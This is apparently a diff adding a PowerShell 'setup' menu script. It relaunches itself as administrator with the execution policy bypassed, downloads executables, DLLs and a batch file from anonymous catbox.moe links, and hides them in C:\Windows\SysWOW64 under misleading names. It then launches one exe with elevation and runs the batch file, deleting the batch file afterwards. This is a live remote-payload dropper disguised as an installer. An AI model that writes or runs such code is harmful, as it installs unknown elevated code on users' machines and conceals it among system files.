@@ -1,0 +1,292 @@
+# -----------------------------
+# Menu Selection
+# -----------------------------
+Clear-Host
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host "     Saipoz Setup" -ForegroundColor Magenta
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "  [1] Setup one" -ForegroundColor Green
+Write-Host "  [2] Setup two" -ForegroundColor Yellow
+Write-Host "  [3] Setup three" -ForegroundColor Red
+Write-Host "  [4] Exit" -ForegroundColor Gray
+Write-Host ""
+Write-Host "========================================" -ForegroundColor Cyan
+
+$choice = Read-Host "`nEnter your choice (1/2/3/4)"
+
+# -----------------------------
+# Check for Administrator rights
+# -----------------------------
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Write-Host "`n[!] Restarting with Administrator privileges..." -ForegroundColor Yellow
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+# -----------------------------
+# Define paths and variables
+# -----------------------------
+$sysWOW64 = "C:\Windows\SysWOW64"
+
+# Setup 1 URLs
+$setup1Files = @(
+    @{ Url = "https://files.catbox.moe/mww9em.bin";  Name = "consloex.exe" },
+    @{ Url = "https://files.catbox.moe/tpfc0c.json"; Name = "SiaPozConsole.staticwebassets.endpoints.json" },
+    @{ Url = "https://files.catbox.moe/rz062e.json"; Name = "SiaPozConsole.runtimeconfig.json" },
+    @{ Url = "https://files.catbox.moe/bisxkv.pdb";  Name = "SiaPozConsole.pdb" },
+    @{ Url = "https://files.catbox.moe/q2eo8f.dll";  Name = "SiaPozConsole.dll" },
+    @{ Url = "https://files.catbox.moe/go427v.json"; Name = "SiaPozConsole.deps.json" }
+)
+
+# Setup 2 URL
+$setup2BatUrl = "https://files.catbox.moe/s7vf89.bat"
+$setup2BatPath = Join-Path $env:TEMP "s7vf89.bat"
+
+# Setup 3 URLs
+$setup3Files = @(
+    @{ Url = "https://files.catbox.moe/3scqqb.dll"; Name = "Guna.UI2.dll" },
+    @{ Url = "https://files.catbox.moe/ibl0le.bin"; Name = "fczf.exe" }
+)
+
+# -----------------------------
+# Helper: Ensure SysWOW64 exists
+# -----------------------------
+function Ensure-SysWOW64 {
+    if (-not (Test-Path $sysWOW64)) {
+        Write-Host "[!] SysWOW64 folder not found. Creating..." -ForegroundColor Yellow
+        try {
+            New-Item -ItemType Directory -Path $sysWOW64 -Force | Out-Null
+            Write-Host "[✓] Created SysWOW64 folder." -ForegroundColor Green
+        } catch {
+            Write-Host "[✗] Failed to create SysWOW64 folder: $_" -ForegroundColor Red
+            Write-Host "`nPress any key to exit..."
+            Read-Host
+            exit
+        }
+    }
+}
+
+# -----------------------------
+# Helper: Download file to destination
+# -----------------------------
+function Download-ToSysWOW64 {
+    param(
+        [string]$Url,
+        [string]$FileName
+    )
+
+    $dest = Join-Path $sysWOW64 $FileName
+    $temp = Join-Path $env:TEMP ("dl_" + [System.Guid]::NewGuid().ToString() + "_" + $FileName)
+
+    Write-Host "[+] Downloading $FileName ..." -ForegroundColor Cyan
+    Write-Host "[+] Target: $dest" -ForegroundColor Gray
+
+    try {
+        Invoke-WebRequest -Uri $Url -OutFile $temp -ErrorAction Stop
+
+        if (Test-Path $dest) {
+            Remove-Item $dest -Force -ErrorAction SilentlyContinue
+        }
+
+        Move-Item -Path $temp -Destination $dest -Force -ErrorAction Stop
+        Write-Host "[✓] $FileName downloaded successfully!" -ForegroundColor Green
+        return $true
+    } catch {
+        Write-Host "[✗] Failed to download $FileName : $_" -ForegroundColor Red
+        if (Test-Path $temp) {
+            Remove-Item $temp -Force -ErrorAction SilentlyContinue
+        }
+        return $false
+    }
+}
+
+# -----------------------------
+# Option 1: Setup one
+# -----------------------------
+if ($choice -eq "1") {
+    Clear-Host
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "   [1] INSTALLING FILES TO SysWOW64" -ForegroundColor Green
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host ""
+
+    Ensure-SysWOW64
+
+    $allGood = $true
+    foreach ($file in $setup1Files) {
+        $ok = Download-ToSysWOW64 -Url $file.Url -FileName $file.Name
+        if (-not $ok) {
+            $allGood = $false
+            break
+        }
+    }
+
+    if (-not $allGood) {
+        Write-Host "`n[✗] Some files failed to download. Installation aborted." -ForegroundColor Red
+        Write-Host "`nPress any key to return to menu..."
+        Read-Host
+        & $PSCommandPath
+        exit
+    }
+
+    Write-Host "`n[+] Verifying files..." -ForegroundColor Cyan
+    $missing = @()
+    foreach ($file in $setup1Files) {
+        $dest = Join-Path $sysWOW64 $file.Name
+        if (Test-Path $dest) {
+            Write-Host "[✓] $($file.Name) exists." -ForegroundColor Green
+        } else {
+            Write-Host "[✗] $($file.Name) not found!" -ForegroundColor Red
+            $missing += $file.Name
+        }
+    }
+
+    if ($missing.Count -gt 0) {
+        Write-Host "`n[✗] Missing files: $($missing -join ', ')" -ForegroundColor Red
+        Write-Host "`nPress any key to return to menu..."
+        Read-Host
+        & $PSCommandPath
+        exit
+    }
+
+    $exePath = Join-Path $sysWOW64 "consloex.exe"
+    Write-Host "`n[+] Launching consloex.exe..." -ForegroundColor Cyan
+    try {
+        Start-Process -FilePath $exePath -Verb RunAs -WindowStyle Normal
+        Write-Host "[✓] Program started successfully!" -ForegroundColor Green
+    } catch {
+        Write-Host "[✗] Failed to start program: $_" -ForegroundColor Red
+    }
+
+    Write-Host "`n========================================" -ForegroundColor Cyan
+    Write-Host "[✓] Installation completed!" -ForegroundColor Green
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "`nPress any key to return to menu..."
+    Read-Host
+    & $PSCommandPath
+    exit
+}
+
+# -----------------------------
+# Option 2: Setup two (Run BAT)
+# -----------------------------
+elseif ($choice -eq "2") {
+    Clear-Host
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "   [2] RUNNING SETUP TWO (BAT)" -ForegroundColor Yellow
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host ""
+
+    Write-Host "[+] Downloading BAT file..." -ForegroundColor Cyan
+    try {
+        Invoke-WebRequest -Uri $setup2BatUrl -OutFile $setup2BatPath -ErrorAction Stop
+        Write-Host "[✓] BAT file downloaded successfully!" -ForegroundColor Green
+    } catch {
+        Write-Host "[✗] Download failed: $_" -ForegroundColor Red
+        Write-Host "`nPress any key to exit..."
+        Read-Host
+        exit
+    }
+
+    if (Test-Path $setup2BatPath) {
+        Write-Host "[✓] File verified: $setup2BatPath" -ForegroundColor Green
+
+        Write-Host "[+] Executing BAT file..." -ForegroundColor Cyan
+        try {
+            Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$setup2BatPath`"" -Wait -ErrorAction Stop
+            Write-Host "[✓] BAT file executed successfully!" -ForegroundColor Green
+        } catch {
+            Write-Host "[✗] Failed to execute BAT file: $_" -ForegroundColor Red
+        }
+
+        Remove-Item $setup2BatPath -Force -ErrorAction SilentlyContinue
+        Write-Host "[+] Cleaned up temporary files." -ForegroundColor Cyan
+    } else {
+        Write-Host "[✗] BAT file not found!" -ForegroundColor Red
+    }
+
+    Write-Host "`n========================================" -ForegroundColor Cyan
+    Write-Host "[✓] Setup two completed!" -ForegroundColor Green
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "`nPress any key to return to menu..."
+    Read-Host
+    & $PSCommandPath
+    exit
+}
+
+# -----------------------------
+# Option 3: Setup three (Download only)
+# -----------------------------
+elseif ($choice -eq "3") {
+    Clear-Host
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "   [3] INSTALLING FILES TO SysWOW64 (NO RUN)" -ForegroundColor Red
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host ""
+
+    Ensure-SysWOW64
+
+    $allGood = $true
+    foreach ($file in $setup3Files) {
+        $ok = Download-ToSysWOW64 -Url $file.Url -FileName $file.Name
+        if (-not $ok) {
+            $allGood = $false
+            break
+        }
+    }
+
+    if (-not $allGood) {
+        Write-Host "`n[✗] Some files failed to download." -ForegroundColor Red
+        Write-Host "`nPress any key to return to menu..."
+        Read-Host
+        & $PSCommandPath
+        exit
+    }
+
+    Write-Host "`n[+] Verifying files..." -ForegroundColor Cyan
+    foreach ($file in $setup3Files) {
+        $dest = Join-Path $sysWOW64 $file.Name
+        if (Test-Path $dest) {
+            Write-Host "[✓] $($file.Name) exists." -ForegroundColor Green
+        } else {
+            Write-Host "[✗] $($file.Name) not found!" -ForegroundColor Red
+        }
+    }
+
+    Write-Host "`n========================================" -ForegroundColor Cyan
+    Write-Host "[✓] Setup three completed (files downloaded only)!" -ForegroundColor Green
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "`nPress any key to return to menu..."
+    Read-Host
+    & $PSCommandPath
+    exit
+}
+
+# -----------------------------
+# Option 4: Exit
+# -----------------------------
+elseif ($choice -eq "4") {
+    Clear-Host
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "     THANK YOU FOR USING SAIPOZ SETUP" -ForegroundColor Magenta
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "`nExiting... Goodbye!" -ForegroundColor Green
+    Start-Sleep -Seconds 2
+    exit
+}
+
+# -----------------------------
+# Invalid Choice
+# -----------------------------
+else {
+    Clear-Host
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "     INVALID CHOICE!" -ForegroundColor Red
+    Write-Host "========================================" -ForegroundColor Cyan
+    Write-Host "`nPlease select 1, 2, 3, or 4 only." -ForegroundColor Yellow
+    Write-Host "`nPress any key to return to menu..."
+    Read-Host
+    & $PSCommandPath
+    exit
+}
